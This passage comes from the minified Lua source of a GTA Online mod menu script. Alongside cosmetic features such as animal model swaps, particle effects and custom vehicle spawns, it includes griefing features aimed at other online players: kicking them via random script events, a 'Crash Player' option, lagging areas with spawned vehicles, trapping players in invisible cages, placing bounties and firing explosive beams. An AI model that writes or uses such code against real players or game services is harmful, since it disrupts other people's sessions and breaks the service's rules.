            Q["asteroids"] = {}
            f("Cleared all Asteroids.")
        end
    )
    aL(
        "Apply random Force to Player",
        R["opl_misc"],
        function(aP, id)
            local dd = aW(id)
            if ped.is_ped_in_any_vehicle(dd) then
                dd = ped.get_vehicle_ped_is_using(dd)
            else
                f("It works better, if target is in a Vehicle.")
            end
            aQ(dd)
            local de = entity.get_entity_velocity(dd)
            for B = 1, 5 do
                de.x = math.random(math.floor(de.x - 50), math.floor(de.x + 50))
                de.y = math.random(math.floor(de.y - 50), math.floor(de.y + 50))
                de.z = math.random(math.floor(de.z - 50), math.floor(de.z + 50))
                entity.set_entity_velocity(dd, de)
                system.wait(10)
            end
        end
    )
    aL(
        "Trap in Stunt Tube",
        R["opl_misc"],
        function(aP, id)
            local bb = aZ(aW(id))
            bb.z = bb.z - 5
            entity.set_entity_rotation(object.create_object(1125864094, bb, true, false), v3(0, 90, 0))
        end
    )
    aL(
        "Trap in invisible Cage",
        R["opl_misc"],
        function(aP, id)
            local bb = aZ(aW(id))
            bb.x = bb.x + 1.24
            bb.y = bb.y + 0.24
            aS(401136338)
            local df = object.create_object(401136338, bb, true, false)
            entity.set_entity_visible(df, false)
            entity.set_entity_rotation(df, v3(0, -90, 0))
            entity.freeze_entity(df, true)
            bb = aZ(aW(id))
            bb.x = bb.x + 0.02
            bb.y = bb.y + 0.82
            df = object.create_object(401136338, bb, true, false)
            entity.set_entity_visible(df, false)
            entity.set_entity_rotation(df, v3(90, -90, 0))
            entity.freeze_entity(df, true)
            aT(401136338)
        end
    )
    R["opl_bounty"] = aK("Bounty", R["opl_parent"]).id
    for B = 1, #L do
        aL(
            L[B] .. "$",
            R["opl_bounty"],
            function()
                local d1 = 0
                if S["anonymous_bounty"].on then
                    d1 = 1
                end
                for cU = 0, 31 do
                    if aB(cU) ~= -1 then
                        aU(
                            544453591,
                            cU,
                            {
                                69,
                                id,
                                1,
                                L[B],
                                0,
                                d1,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                script.get_global_i(1650640 + 9),
                                script.get_global_i(1650640 + 10)
                            }
                        )
                    end
                end
            end
        )
    end
    R["opl_lag_area"] =
        aK(
        "Lag Area with Vehicles",
        R["opl_parent"],
        function()
            f("DANGEROUS! ONLY USE WITH CAUTION!", 208)
        end
    ).id
    for B = 1, #H do
        aL(
            "Lag / Rain Area with " .. H[B][1],
            R["opl_lag_area"],
            function(aP, id)
                bH(id, H[B][2])
            end
        )
    end
    aL(
        "Delete Vehicles",
        R["opl_lag_area"],
        function()
            j("Clearing Vehicles.")
            b1(Q["lag_area"])
            Q["lag_area"] = {}
            f("Cleared Vehicles.")
        end
    )
    R["opl_malicious"] = aK("Malicious (Kick / Crash)", R["opl_parent"]).id
    aM(
        "Kick Experimental",
        R["opl_malicious"],
        function(aP, id)
            if aP.on then
                for B = 1, 25 do
                    aU(math.random(0xd00000, 0xfeb00000), id, {})
                end
            end
            return aO(aP)
        end
    )
    aL(
        "Kick Player",
        R["opl_malicious"],
        function(aP, id)
            bv(false, id)
        end
    )
    aL(
        "Host Kick Player",
        R["opl_malicious"],
        function(aP, id)
            if network.network_is_host() then
                network.network_session_kick_player(id)
            else
                f("You are not Session-Host!")
            end
        end
    )
    aL(
        "Crash Player",
        R["opl_malicious"],
        function(aP, id)
            bI(id)
        end
    )
    R["chat"] = aD("Chat-Features", R["parent"])
    R["chat"].hidden = c["chat_hidden"]
    R["chat"] = R["chat"].id
    S["chat_log"] =
        aH(
        "Chat-Log",
        R["chat"],
        function(aP)
            c["chat_log"] = aP.on
        end
    )
    S["chat_log"].on = c["chat_log"]
    S["chat_russki"] =
        aH(
        "Kick if Russki Char is typed",
        R["chat"],
        function(aP)
            c["chat_russki"] = aP.on
        end
    )
    S["chat_russki"].on = c["chat_russki"]
    S["chat_begger"] =
        aH(
        "Punish Money Beggers",
        R["chat"],
        function(aP)
            c["chat_begger"] = aP.on
        end
    )
    S["chat_begger"].on = c["chat_begger"]
    S["send_msg_to_script_users"] =
        aG(
        "Send Message to 2Take1Script-Users",
        R["chat"],
        function()
            local aR, co = input.get("Enter Message", "", 128, 0)
            while aR == 1 do
                system.wait(0)
                aR, co = input.get("Enter Message", "", 128, 0)
            end
            if aR == 2 then
                return HANDLER_POP
            end
            if co ~= "" then
                local cm = {}
                cm[1] = 6666
                for a, h in utf8.codes(co) do
                    cm[#cm + 1] = h
                end
                for B = 0, 31 do
                    if player.is_player_valid(B) then
                        if B ~= aV() and aB(B) ~= -1 then
                            aU(0xfaaab4a3, B, cm)
                        end
                    end
                end
            end
        end
    )
    S["chat_cmd"] =
        aH(
        "Enable Chat-Commands",
        R["chat"],
        function(aP)
            c["chat_cmd"] = aP.on
        end
    )
    S["chat_cmd"].on = c["chat_cmd"]
    R["chat_cmd"] = aD("Chat-Commands", R["chat"]).id
    for B = 1, #t do
        S[t[B][1]] =
            aH(
            t[B][2],
            R["chat_cmd"],
            function(aP)
                c[t[B][1]] = aP.on
            end
        )
        S[t[B][1]].on = c[t[B][1]]
    end
    aG("[SU] = Script-User", R["chat_cmd"])
    aG(
        "Delete Vehicles from !lag",
        R["chat"],
        function()
            b1(Q["lag_area"])
            Q["lag_area"] = {}
        end
    )
    S["chat_cmd_friends"] =
        aH(
        "Chat Commands for Friends",
        R["chat"],
        function(aP)
            c["chat_cmd_friends"] = aP.on
        end
    )
    S["chat_cmd_friends"].on = c["chat_cmd_friends"]
    S["chat_cmd_all"] =
        aH(
        "Chat Commands Everyone",
        R["chat"],
        function(aP)
            c["chat_cmd_all"] = aP.on
        end
    )
    S["chat_cmd_all"].on = c["chat_cmd_all"]
    R["custom_veh"] = aD("Custom Vehicles", R["parent"])
    R["custom_veh"].hidden = c["custom_vehicles_hidden"]
    R["custom_veh"] = R["custom_veh"].id
    S["spawn_preview"] =
        aH(
        "Preview Custom Vehicles",
        R["custom_veh"],
        function(aP)
            if #Q["preview_veh"] > 0 and aP.on then
                if ped.is_ped_in_any_vehicle(aX()) then
                    ped.clear_ped_tasks_immediately(aX())
                end
                local bb = a_()
                if not a1 then
                    for B = 1, #Q["preview_veh"] do
                        entity.set_entity_no_collsion_entity(Q["preview_veh"][B], aX(), true)
                    end
                    a1 = true
                end
                bb.z = bb.z + a0
                local bP = aY()
                bb = bO(bb, bP, a2)
                b0(Q["preview_veh"][1], bb)
                entity.set_entity_rotation(Q["preview_veh"][1], a3)
                a3.z = a3.z + 1
                if a3.z > 360 then
                    a3.z = 0
                end
            end
            if not aP.on then
                b1(Q["preview_veh"])
                Q["preview_veh"] = {}
                a1 = false
                return HANDLER_POP
            end
            return aO(aP)
        end
    )
    for B = 1, #G do
        aG(
            G[B][1],
            R["custom_veh"],
            function()
                local bD = G[B][2]
                j("Attempt to spawn Custom Vehicle.")
                menu.set_menu_can_navigate(false)
                temp_veh = {}
                local bb = v3()
                local dg = v3()
                local dh = 0
                local di = 0
                local bP = 0
                local dj = false
                local dk = ped.get_vehicle_ped_is_using(aX())
                if S["spawn_preview"].on and Q["preview_veh"][1] ~= nil then
                    b1(Q["preview_veh"])
                    Q["preview_veh"] = {}
                    a1 = false
                    system.yield(250)
                end
                for B = 1, #bD[1] do
                    aS(bD[1][B], 7500)
                end
                for B = 2, #bD do
                    bb = a_()
                    if bD[B][6] ~= nil and B == 2 then
                        bb.z = bb.z + bD[B][6]
                    end
                    if B > 2 then
                        bb.z = bb.z + 25
                    end
                    if
                        S["use_own_veh"].on and B == 2 and entity.get_entity_model_hash(dk) == bD[B][1] or
                            bD[2][1] == 0 and B == 2 and S["use_own_veh"].on and dk ~= 0
                     then
                        j("Detected Own Vehicle, using it.")
                        temp_veh[B - 1] = dk
                        dj = true
                    elseif bD[2][1] == 0 and not S["use_own_veh"].on then
                        j("Failed at spawning Custom Vehicle.")
                        f("No Vehicle found, get in a valid Vehicle")
                        menu.set_menu_can_navigate(true)
                        return
                    else
                        if streaming.is_model_a_vehicle(bD[B][1]) then
                            if B == 2 then
                                bP = aY()
                                if bD[B][11] ~= nil then
                                    a2 = bD[B][11]
                                else
                                    a2 = 5
                                end
                                if bD[B][12] ~= nil then
                                    a0 = bD[B][12]
                                else
                                    a0 = 1
                                end
                                bb = bO(bb, bP, a2)
                            end
                            temp_veh[B - 1] = vehicle.create_vehicle(bD[B][1], bb, bP, true, false)
                            decorator.decor_set_int(temp_veh[B - 1], "MPBitset", 1 << 10)
                            local dl = math.random(0, 16777215)
                            if bD[B][4] ~= nil then
                                dl = bD[B][4][1]
                            end
                            vehicle.set_vehicle_custom_primary_colour(temp_veh[B - 1], dl)
                            if bD[B][4] ~= nil then
                                dl = bD[B][4][2]
                            end
                            vehicle.set_vehicle_custom_secondary_colour(temp_veh[B - 1], dl)
                            if bD[B][4] ~= nil then
                                dl = bD[B][4][3]
                            end
                            vehicle.set_vehicle_custom_pearlescent_colour(temp_veh[B - 1], dl)
                            if bD[B][4] ~= nil then
                                dl = bD[B][4][4]
                            end
                            vehicle.set_vehicle_custom_wheel_colour(temp_veh[B - 1], dl)
                            dl = math.random(0, 4)
                            if bD[B][4] ~= nil then
                                dl = bD[B][4][5]
                            end
                            vehicle.set_vehicle_window_tint(temp_veh[B - 1], dl)
                            if streaming.is_model_a_plane(bD[B][1]) and B > 2 then
                                vehicle.control_landing_gear(temp_veh[B - 1], 3)
                            end
                        else
                            temp_veh[B - 1] = object.create_object(bD[B][1], bb, true, false)
                        end
                    end
                    if B > 2 then
                        bb.z = bb.z - 25
                    end
                    if S["set_godmode"].on then
                        entity.set_entity_god_mode(temp_veh[B - 1], true)
                    end
                    if bD[B][5] then
                        entity.set_entity_visible(temp_veh[B - 1], false)
                    end
                    if bD[B][13] then
                        entity.set_entity_alpha(temp_veh[B - 1], bD[B][13], false)
                    end
                    if B > 2 then
                        dh = 0
                        if bD[B][7] ~= nil then
                            dh = bD[B][7]
                        end
                        di = temp_veh[1]
                        if bD[B][8] ~= nil then
                            di = temp_veh[bD[B][8]]
                        end
                        local dm = bD[B][10]
                        if dm == true then
                            entity.set_entity_collision(temp_veh[B - 1], false, false, false)
                        else
                            dm = false
                        end
                        bb = v3()
                        if bD[B][2] ~= nil then
                            bb = bA(bD[B][2])
                        end
                        dg = v3()
                        if bD[B][3] ~= nil then
                            dg = bA(bD[B][3])
                        end
                        if bD[B][1] ~= 0 then
                            entity.attach_entity_to_entity(
                                temp_veh[B - 1],
                                di,
                                dh,
                                bb,
                                dg,
                                false,
                                not dm,
                                false,
                                2,
                                true
                            )
                        end
                        if bD[B][9] ~= nil then
                            local dn
                            aS(bD[B][9])
                            bb = a_()
                            dn = ped.create_ped(6, bD[B][9], bb, 0.0, true, false)
                            system.wait(0)
                            if S["set_godmode"].on then
                                ped.set_ped_max_health(dn, 25000000.0)
                                ped.set_ped_health(dn, 25000000.0)
                                ped.set_ped_can_ragdoll(dn, false)
                                entity.set_entity_god_mode(dn, true)
                            end
                            aT(bD[B][9])
                            if bD[B][1] ~= 0 then
                                ped.set_ped_into_vehicle(dn, temp_veh[B - 1], -1)
                                vehicle.set_vehicle_doors_locked(temp_veh[B - 1], 2)
                            else
                                bb = v3()
                                if bD[B][2] ~= nil then
                                    bb = bA(bD[B][2])
                                end
                                dg = v3()
                                if bD[B][3] ~= nil then
                                    dg = bA(bD[B][3])
                                end
                                entity.attach_entity_to_entity(dn, di, dh, bb, dg, false, not dm, true, 2, true)
                            end
                        end
                    end
                    if S["spawn_preview"].on then
                        Q["preview_veh"][#Q["preview_veh"] + 1] = temp_veh[B - 1]
                    else
                        Q["custom_veh"][#Q["custom_veh"] + 1] = temp_veh[B - 1]
                    end
                end
                if not S["spawn_preview"].on then
                    if S["auto_get_in"].on then
                        ped.set_ped_into_vehicle(aX(), temp_veh[1], -1)
                    end
                end
                if not dj then
                    bL(temp_veh[1])
                end
                for B = 1, #bD[1] do
                    aT(bD[1][B])
                end
                menu.set_menu_can_navigate(true)
                j("Spawn Custom Vehicle Done.")
            end
        )
    end
    aG(
        "Delete Custom Vehicles",
        R["custom_veh"],
        function()
            j("Clearing Custom Vehicles.")
            b1(Q["custom_veh"])
            Q["custom_veh"] = {}
            b1(Q["preview_veh"])
            Q["preview_veh"] = {}
            a1 = false
            f("Cleared Custom Vehicles.")
        end
    )
    R["exp_beam"] = aD("Explosive Beam on Horn", R["parent"])
    R["exp_beam"].hidden = c["explosive_beam_hidden"]
    R["exp_beam"] = R["exp_beam"].id
    S["exp_beam"] =
        aH(
        "Enable Beam on Horn",
        R["exp_beam"],
        function(aP)
            c["exp_beam"] = aP.on
            if aP.on then
                local dp = aV()
                if aB(S["exp_beam_other"].value_i) ~= -1 then
                    dp = S["exp_beam_other"].value_i
                end
                local dd = aW(dp)
                local bc, bb, dq, dr, ds
                local dt = v3()
                local du, dv, dw, dx, dy, dz
                if player.is_player_pressing_horn(dp) then
                    bc = ped.get_vehicle_ped_is_using(dd)
                    for B = 0, 5 do
                        bb = aZ(bc)
                        system.yield(5)
                        if B > 0 then
                            dq = aZ(bc)
                            dt.x = dq.x - bb.x
                            dt.y = dq.y - bb.y
                            dt.z = dq.z - bb.z
                            if dt.x ~= 0 and dt.y ~= 0 and dt.z ~= 0 then
                                dr = 1 / (dt.x * dt.x + dt.y * dt.y + dt.z * dt.z) ^ 0.5
                                ds = math.random(c["exp_beam_min"], c["exp_beam_max"])
                                dq.x = dq.x + ds * dr * dt.x
                                dq.y = dq.y + ds * dr * dt.y
                                dq.z = dq.z + ds * dr * dt.z
                                du = math.floor(dq.x - c["exp_beam_radius"])
                                dv = math.floor(dq.x + c["exp_beam_radius"])
                                dw = math.floor(dq.y - c["exp_beam_radius"])
                                dx = math.floor(dq.y + c["exp_beam_radius"])
                                dy = math.floor(dq.z - c["exp_beam_radius"])
                                dz = math.floor(dq.z + c["exp_beam_radius"])
                                dq.x = math.random(du, dv)
                                dq.y = math.random(dw, dx)
                                dq.z = math.random(dy, dz)
                                fire.add_explosion(dq, c["exp_beam_type"], true, false, 0.1, dd)
                                dq.x = math.random(du, dv)
                                dq.y = math.random(dw, dx)
                                dq.z = math.random(dy, dz)
                                fire.add_explosion(dq, c["exp_beam_type_2"], true, false, 0.1, dd)
                            end
                        end
                    end
                end
            end
            return aO(aP)
        end
    )
    S["exp_beam"].on = c["exp_beam"]
    S["exp_beam_type"] =
        aI(
        "Select Explosion",
        "action_value_i",
        R["exp_beam"],
        function()
            c["exp_beam_type"] = S["exp_beam_type"].value_i
            f("Beam Explosion Type 1: " .. c["exp_beam_type"])
        end
    )
    S["exp_beam_type"].max_i = 74
    S["exp_beam_type"].min_i = 0
    S["exp_beam_type"].value_i = c["exp_beam_type"]
    S["exp_beam_type_2"] =
        aI(
        "Select Explosion 2",
        "action_value_i",
        R["exp_beam"],
        function()
            c["exp_beam_type_2"] = S["exp_beam_type_2"].value_i
            f("Beam Explosion Type 2: " .. c["exp_beam_type_2"])
        end
    )
    S["exp_beam_type_2"].max_i = 74
    S["exp_beam_type_2"].min_i = 0
    S["exp_beam_type_2"].value_i = c["exp_beam_type_2"]
    S["exp_beam_radius"] =
        aI(
        "Select Scattering",
        "action_value_i",
        R["exp_beam"],
        function()
            c["exp_beam_radius"] = S["exp_beam_radius"].value_i
            f("Beam Radius: " .. c["exp_beam_radius"])
        end
    )
    S["exp_beam_radius"].max_i = 10
    S["exp_beam_radius"].min_i = 1
    S["exp_beam_radius"].value_i = c["exp_beam_radius"]
    S["exp_beam_min"] =
        aI(
        "Select Min Range",
        "action_value_i",
        R["exp_beam"],
        function()
            c["exp_beam_min"] = S["exp_beam_min"].value_i
            f("Beam Min Range: " .. c["exp_beam_min"])
        end
    )
    S["exp_beam_min"].max_i = 100
    S["exp_beam_min"].min_i = 10
    S["exp_beam_min"].value_i = c["exp_beam_min"]
    S["exp_beam_min"].mod_i = 5
    S["exp_beam_max"] =
        aI(
        "Select Max Range",
        "action_value_i",
        R["exp_beam"],
        function()
            c["exp_beam_max"] = S["exp_beam_max"].value_i
            f("Beam Max Range: " .. c["exp_beam_max"])
        end
    )
    S["exp_beam_max"].max_i = 300
    S["exp_beam_max"].min_i = 100
    S["exp_beam_max"].value_i = c["exp_beam_max"]
    S["exp_beam_max"].mod_i = 5
    S["exp_beam_other"] =
        aI(
        "Enable Horn for Player",
        "action_value_i",
        R["exp_beam"],
        function()
            if aB(S["exp_beam_other"].value_i) ~= -1 then
                f("Selected Player: " .. aA(S["exp_beam_other"].value_i))
            else
                f("Not a valid Player.")
            end
        end
    )
    S["exp_beam_other"].max_i = 31
    S["exp_beam_other"].min_i = -1
    S["exp_beam_other"].value_i = -1
    R["bac"] = aD("Better Animal Changer", R["parent"])
    R["bac"].hidden = c["animal_changer_hidden"]
    R["bac"] = R["bac"].id
    R["bac_ga"] = aD("Ground Animals", R["bac"]).id
    aG(
        "Bigfoot",
        R["bac_ga"],
        function()
            bl(0x61D4C771, nil, true, nil, true)
        end
    )
    aG(
        "Bigfoot 2",
        R["bac_ga"],
        function()
            bl(0xAD340F5A, nil, true, nil, true)
        end
    )
    aG(
        "Boar",
        R["bac_ga"],
        function()
            bl(0xCE5FF074)
        end
    )
    aG(
        "Cat",
        R["bac_ga"],
        function()
            bl(0x573201B8)
        end
    )
    aG(
        "Chimp",
        R["bac_ga"],
        function()
            bl(0xA8683715, nil, nil, true)
        end
    )
    aG(
        "Chop",
        R["bac_ga"],
        function()
            bl(0x14EC17EA, nil, true)
        end
    )
    aG(
        "Cow",
        R["bac_ga"],
        function()
            bl(0xFCFA9E1E)
        end
    )
    aG(
        "Coyote",
        R["bac_ga"],
        function()
            bl(0x644AC75E)
        end
    )
    aG(
        "Deer",
        R["bac_ga"],
        function()
            bl(0xD86B5A95)
        end
    )
    aG(
        "German Shepherd",
        R["bac_ga"],
        function()
            bl(0x431FC24C, nil, true)
        end
    )
    aG(
        "Hen",
        R["bac_ga"],
        function()
            bl(0x6AF51FAF)
        end
    )
    aG(
        "Husky",
        R["bac_ga"],
        function()
            bl(0x4E8F95A2, nil, true)
        end
    )
    aG(
        "Mountain Lion",
        R["bac_ga"],
        function()
            bl(0x1250D7BA, nil, true)
        end
    )
    aG(
        "Pig",
        R["bac_ga"],
        function()
            bl(0xB11BAB56)
        end
    )
    aG(
        "Poodle",
        R["bac_ga"],
        function()
            bl(0x431D501C)
        end
    )
    aG(
        "Pug",
        R["bac_ga"],
        function()
            bl(0x6D362854)
        end
    )
    aG(
        "Rabbit",
        R["bac_ga"],
        function()
            bl(0xDFB55C81)
        end
    )
    aG(
        "Rat",
        R["bac_ga"],
        function()
            bl(0xC3B52966)
        end
    )
    aG(
        "Golden Retriever",
        R["bac_ga"],
        function()
            bl(0x349F33E1, nil, true)
        end
    )
    aG(
        "Rhesus",
        R["bac_ga"],
        function()
            bl(0xC2D06F53, nil, nil, true)
        end
    )
    aG(
        "Rottweiler",
        R["bac_ga"],
        function()
            bl(0x9563221D, nil, true)
        end
    )
    aG(
        "Westy",
        R["bac_ga"],
        function()
            bl(0xAD7844BB)
        end
    )
    R["bac_wa"] =
        aD(
        "Water Animals",
        R["bac"],
        function()
            f("Note that these Models will only work in Water!", 48)
        end
    ).id
    aG(
        "Dolphin",
        R["bac_wa"],
        function()
            bl(0x8BBAB455, true)
        end
    )
    aG(
        "Fish",
        R["bac_wa"],
        function()
            bl(0x2FD800B7, true)
        end
    )
    aG(
        "Hammershark",
        R["bac_wa"],
        function()
            bl(0x3C831724, true)
        end
    )
    aG(
        "Humpback",
        R["bac_wa"],
        function()
            bl(0x471BE4B2, true)
        end
    )
    aG(
        "Killerwhale",
        R["bac_wa"],
        function()
            bl(0x8D8AC8B9, true)
        end
    )
    aG(
        "Shark",
        R["bac_wa"],
        function()
            bl(0x06C3F072, true, true)
        end
    )
    aG(
        "Stingray",
        R["bac_wa"],
        function()
            bl(0xA148614D, true)
        end
    )
    R["bac_fa"] = aD("Flying Animals", R["bac"]).id
    aG(
        "Cormorant",
        R["bac_fa"],
        function()
            bl(0x56E29962)
        end
    )
    aG(
        "Chickenhawk",
        R["bac_fa"],
        function()
            bl(0xAAB71F62)
        end
    )
    aG(
        "Crow",
        R["bac_fa"],
        function()
            bl(0x18012A9F)
        end
    )
    aG(
        "Pigeon",
        R["bac_fa"],
        function()
            bl(0x06A20728)
        end
    )
    aG(
        "Seagull",
        R["bac_fa"],
        function()
            bl(0xD3939DFD)
        end
    )
    R["bac_sm"] = aD("Standard Models", R["bac"]).id
    aG(
        "Franklin",
        R["bac_sm"],
        function()
            bl(0x9B22DBAF, nil, nil, nil, true)
        end
    )
    aG(
        "Michael",
        R["bac_sm"],
        function()
            bl(0x0D7114C9, nil, nil, nil, true)
        end
    )
    aG(
        "Trevor",
        R["bac_sm"],
        function()
            bl(0x9B810FA2, nil, nil, nil, true)
        end
    )
    aG(
        "MP Female",
        R["bac_sm"],
        function()
            bl(0x9C9EFFD8, nil, true, nil, true)
        end
    )
    aG(
        "MP Male",
        R["bac_sm"],
        function()
            bl(0x705E61F2, nil, true, nil, true)
        end
    )
    S["bl_mdl_change"] =
        aH(
        "Safe Model Change",
        R["bac"],
        function(aP)
            c["bl_mdl_change"] = aP.on
        end
    )
    S["bl_mdl_change"].on = c["bl_mdl_change"]
    aG(
        "Fix endless loading Screen",
        R["bac"],
        function()
            bl(0x9B22DBAF, nil, nil, nil, true)
            system.wait(100)
            ped.set_ped_health(aX(), 0)
        end
    )
    R["ptfx"] = aD("PTFX", R["parent"])
    R["ptfx"].hidden = c["ptfx_hidden"]
    R["ptfx"] = R["ptfx"].id
    S["sparkling_ass"] =
        aH(
        "Sparkling Ass",
        R["ptfx"],
        function(aP)
            if aP.on then
                graphics.set_next_ptfx_asset("scr_indep_fireworks")
                while not graphics.has_named_ptfx_asset_loaded("scr_indep_fireworks") do
                    graphics.request_named_ptfx_asset("scr_indep_fireworks")
                    system.wait(0)
                end
                graphics.start_networked_particle_fx_non_looped_at_coord(
                    "scr_indep_firework_trail_spawn",
                    a_(),
                    v3(60, 0, 0),
                    0.33,
                    true,
                    true,
                    true
                )
                system.wait(25)
            end
            c["sparkling_ass"] = aP.on
            return aO(aP)
        end
    )
    S["sparkling_ass"].on = c["sparkling_ass"]
    S["sparkling_tires"] =
        aH(
        "Sparkling Tires (WIP)",
        R["ptfx"],
        function(aP)
            if aP.on then
                local bc = ped.get_vehicle_ped_is_using(aX())
                if bc ~= 0 then
                    local dA = {"wheel_lf", "wheel_rf", "wheel_lr", "wheel_rr"}
                    for B = 1, #dA do
                        aS(1803116220)
                        local dB = object.create_object(1803116220, a_(), true, false)
                        entity.set_entity_collision(dB, false, false, false)
                        entity.set_entity_visible(dB, false)
                        local bX = B
                        if menu.get_version() ~= "2.4.2" then
                            bX = entity.get_entity_bone_index_by_name(bc, dA[B])
                        end
                        entity.attach_entity_to_entity(dB, bc, bX, v3(), v3(), true, true, false, 0, true)
                        graphics.set_next_ptfx_asset("scr_indep_fireworks")
                        while not graphics.has_named_ptfx_asset_loaded("scr_indep_fireworks") do
                            graphics.request_named_ptfx_asset("scr_indep_fireworks")
                            system.wait(0)
                        end
                        graphics.start_networked_particle_fx_non_looped_at_coord(
                            "scr_indep_firework_trail_spawn",
                            aZ(dB),
                            v3(60, 0, 0),
                            0.5,
                            true,
                            true,
                            true
                        )
                        aQ(dB, 5)
                        entity.detach_entity(dB)
                        entity.set_entity_velocity(dB, v3())
                        b0(dB, v3(8000, 8000, -1000))
                        entity.delete_entity(dB)
                    end
                    aT(1803116220)
                    system.wait(25)
                end
            end
            c["sparkling_tires"] = aP.on
            return aO(aP)
        end
    )
    S["sparkling_tires"].on = c["sparkling_tires"]
    S["smoke_area"] =
        aH(
        "Smoke Area",
        R["ptfx"],
        function(aP)
            if aP.on then
                for B = 1, 16 do
                    local bb = a_()
                    local dC = 2 * math.pi
                    dC = dC / 16
                    dC = dC * B
                    bb.x = bb.x + 18 * math.cos(dC)
                    bb.y = bb.y + 18 * math.sin(dC)
                    bb.z = bb.z - 2.5
                    graphics.set_next_ptfx_asset("scr_recartheft")
                    while not graphics.has_named_ptfx_asset_loaded("scr_recartheft") do
                        graphics.request_named_ptfx_asset("scr_recartheft")
                        system.wait(0)
                    end
                    graphics.start_networked_particle_fx_non_looped_at_coord(
                        "scr_wheel_burnout",
                        bb,
                        v3(),
                        2.5,
                        true,
                        true,
                        true
                    )
                    system.wait(40)
                end
            end
            c["smoke_area"] = aP.on
            return aO(aP)
        end
    )
    S["smoke_area"].on = c["smoke_area"]
    S["fire_circle"] =
        aH(
        "Fire Circle",
        R["ptfx"],
        function(aP)
            if aP.on then
                if au["fire_balls"][1] == nil then
                    for B = 1, 48 do
                        aS(1803116220)
                        au["fire_balls"][B] = object.create_object(1803116220, a_(), true, false)
                        entity.set_entity_collision(au["fire_balls"][B], false, false, false)
                        entity.set_entity_visible(au["fire_balls"][B], false)
                    end
                    aT(1803116220)
                end
                for B = 1, 48 do
                    local bb = a_()
                    local dC = 2 * math.pi
                    dC = dC / 48
                    dC = dC * math.random(1, 64)
                    bb.x = bb.x + 10 * math.cos(dC)
                    bb.y = bb.y + 10 * math.sin(dC)
                    bb.z = bb.z - 1.5
                    b0(au["fire_balls"][B], bb)
                end
                system.wait(10)
                if au["fire_circle"][1] == nil then
                    for B = 1, 48 do
                        graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                        while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                            graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                            system.wait(0)
                        end
                        au["fire_circle"][B] =
                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping",
                            au["fire_balls"][B],
                            v3(),
                            v3(90, 0, 0),
                            1
                        )
                    end
                end
            end
            if not aP.on then
                b1(au["fire_balls"])
                au["fire_balls"] = {}
                if au["fire_circle"][1] ~= nil then
                    for B = 1, #au["fire_circle"] do
                        graphics.remove_particle_fx(au["fire_circle"][B], true)
                    end
                    au["fire_circle"] = {}
                end
            end
            return aO(aP)
        end
    )
    S["fire_circle"].on = c["fire_circle"]
    S["fire_fart"] =
        aI(
        "Fire Fart",
        "action_value_i",
        R["ptfx"],
        function(aP)
            c["fire_fart"] = S["fire_fart"].value_i
            local bc = ped.get_vehicle_ped_is_using(aX())
            if bc ~= 0 then
                f("Fire Fart in a vehicle is too dangerous, get out!", 162)
            else
                local ca = 0x187D938D
                local dD = "weap_xs_vehicle_weapons"
                local dE = "muz_xs_turret_flamethrower_looping"
                aS(ca)
                local bP = player.get_player_heading(aV())
                local cb = vehicle.create_vehicle(ca, a_(), bP, true, false)
                aQ(cb)
                entity.set_entity_visible(cb, false)
                aT(ca)
                decorator.decor_set_int(cb, "MPBitset", 1 << 10)
                ped.set_ped_into_vehicle(aX(), cb, -1)
                system.wait(500)
                graphics.set_next_ptfx_asset(dD)
                while not graphics.has_named_ptfx_asset_loaded(dD) do
                    graphics.request_named_ptfx_asset(dD)
                    system.wait(0)
                end
                local dF = aP.value_i
                local fire = graphics.start_ptfx_looped_on_entity(dE, aX(), v3(), v3(180, 0, 0), dF * 0.1)
                local bb = aZ(cb)
                local dg = entity.get_entity_rotation(cb)
                local dG = dg
                dG:transformRotToDir()
                dG = dG * 1 * dF
                dG.z = bb.z + 0.6666666 * dF
                local dH = dG
                entity.set_entity_velocity(cb, dH)
                system.wait(250 * dF)
                graphics.remove_particle_fx(fire, true)
                while ped.is_ped_in_any_vehicle(aX()) do
                    ai.task_leave_vehicle(aX(), cb, 16)
                    system.wait(25)
                end
                b1({cb})
            end
        end
    )
    S["fire_fart"].max_i = 16
    S["fire_fart"].min_i = 4
    S["fire_fart"].value_i = c["fire_fart"]
    S["fire_ass"] =
        aH(
        "Fire Ass",
        R["ptfx"],
        function(aP)
            c["fire_ass"] = aP.on
            if aP.on then
                if au["fire_ass_ball"] == nil then
                    aS(1803116220)
                    au["fire_ass_ball"] = object.create_object(1803116220, a_(), true, false)
                    entity.set_entity_collision(au["fire_ass_ball"], false, false, false)
                    entity.set_entity_visible(au["fire_ass_ball"], false)
                    aT(1803116220)
                end
                if au["fire_ass"] == nil then
                    local dD = "weap_xs_vehicle_weapons"
                    local dE = "muz_xs_turret_flamethrower_looping"
                    graphics.set_next_ptfx_asset(dD)
                    while not graphics.has_named_ptfx_asset_loaded(dD) do
                        graphics.request_named_ptfx_asset(dD)
                        system.wait(0)
                    end
                    au["fire_ass"] = graphics.start_ptfx_looped_on_entity(dE, aX(), v3(), v3(180, 0, 0), 0.333)
                end
                local bb = a_()
                b0(au["fire_ass_ball"], a_())
            end
            if not aP.on then
                if au["fire_ass"] ~= nil then
                    graphics.remove_particle_fx(au["fire_ass"], true)
                    au["fire_ass"] = nil
                end
                b1({au["fire_ass_ball"]})
                au["fire_ass_ball"] = nil
            end
            return aO(aP)
        end
    )
    S["fire_ass"].on = c["fire_ass"]
    R["misc"] = aD("Miscellaneous", R["parent"])
    R["misc"].hidden = c["misc_hidden"]
    R["misc"] = R["misc"].id
    R["weapon"] = aD("Weapon-Features", R["misc"]).id
    S["load_weapons"] =
        aH(
        "Load Weapons",
        R["weapon"],
        function(aP)
            if aP.on then
                local time = utils.time_ms() + 500
                while aP.on do
                    system.wait(0)
                    if time < utils.time_ms() then
                        break
                    end
                end
                local dI = weapon.get_all_weapon_hashes()
                for B = 1, #dI do
                    if weapon.has_ped_got_weapon(aX(), dI[B]) then
                        local dJ = false
                        for cH = 1, #P do
                            if dI[B] == P[cH][1] then
                                dJ = true
                            end
                        end
                        if not dJ then
                            weapon.remove_weapon_from_ped(aX(), dI[B])
                        end
                    end
                end
                for B = 1, #P do
                    if not weapon.has_ped_got_weapon(aX(), P[B][1]) then
